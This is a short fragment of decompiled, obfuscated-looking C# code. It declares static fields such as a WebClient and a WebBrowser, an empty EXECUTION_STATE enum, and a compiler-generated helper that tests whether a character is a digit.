		private static WebClient webClient_0 = new WebClient();

		// Token: 0x04000049 RID: 73
		private static ImageAttributes imageAttributes_0 = new ImageAttributes();

		// Token: 0x0400004A RID: 74
		private static WebBrowser webBrowser_0 = new WebBrowser();

		// Token: 0x0400004B RID: 75
		private static long long_0;

		// Token: 0x0400004C RID: 76
		private static StaticLocalInitFlag staticLocalInitFlag_0;

		// Token: 0x0400004D RID: 77
		private static long long_1;

		// Token: 0x0400004E RID: 78
		private static StaticLocalInitFlag staticLocalInitFlag_1;

		// Token: 0x0200000F RID: 15
		private enum EXECUTION_STATE
		{

		}

		// Token: 0x02000010 RID: 16
		[CompilerGenerated]
		[Serializable]
		internal sealed class Class1
		{
			// Token: 0x060001A0 RID: 416 RVA: 0x00002385 File Offset: 0x00000585
			internal bool method_0(char _char_0)
			{
				return char.IsDigit(_char_0);
			}

			// Token: 0x04000050 RID: 80
			public static readonly Module2.Class1 class1_0 = new Module2.Class1();

			// Token: 0x04000051 RID: 81
			public static Func<char, bool> func_0;
		}
	}
}
